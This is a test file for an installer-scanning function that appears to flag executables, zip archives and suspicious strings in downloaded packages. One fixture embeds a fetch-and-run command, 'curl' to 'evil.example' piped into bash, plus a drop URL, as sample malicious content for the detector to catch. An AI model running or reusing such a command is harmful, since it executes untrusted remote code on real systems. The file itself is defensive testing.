import { describe, it, expect } from "vitest";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { analyzeInstallerPath } from "../services/installerProbe.js";

describe("analyzeInstallerPath", () => {
  it("missing file", () => {
    const a = analyzeInstallerPath("/tmp/aegis-nope-install.pkg");
    expect(a.ok).toBe(false);
    expect(a.riskFlags).toContain("file_not_found");
  });

  it("flags pe-like and suspicious strings", () => {
    const p = path.join(os.tmpdir(), `aegis-inst-${Date.now()}.bin`);
    const payload = Buffer.concat([
      Buffer.from([0x4d, 0x5a, 0x90, 0x00]),
      Buffer.from("curl https://evil.example/x.sh && bash -c payload\n"),
      Buffer.from("password LaunchAgent\n".repeat(20)),
      Buffer.from("https://cdn.example/drop.bin\n"),
    ]);
    fs.writeFileSync(p, payload);
    const a = analyzeInstallerPath(p);
    expect(a.ok).toBe(true);
    expect(a.kind).toBe("pe-exe");
    expect(a.riskFlags).toContain("installer_or_executable");
    expect(a.suspiciousStrings.length).toBeGreaterThan(0);
    expect(a.aiBrief).toContain("Analyze this downloaded package");
    expect(a.hashes.sha256).toHaveLength(64);
    fs.unlinkSync(p);
  });

  it("lists zip members", () => {
    const p = path.join(os.tmpdir(), `aegis-zip-${Date.now()}.bin`);
    const name = Buffer.from("setup.exe");
    const header = Buffer.alloc(30);
    header.writeUInt32LE(0x04034b50, 0);
    header.writeUInt16LE(name.length, 26);
    fs.writeFileSync(p, Buffer.concat([header, name, Buffer.from("xx")]));
    const a = analyzeInstallerPath(p);
    expect(a.kind).toContain("zip");
    expect(a.archiveMembers.some((m) => m.includes("setup.exe"))).toBe(true);
    expect(a.riskFlags).toContain("archive_executables");
    fs.unlinkSync(p);
  });
});
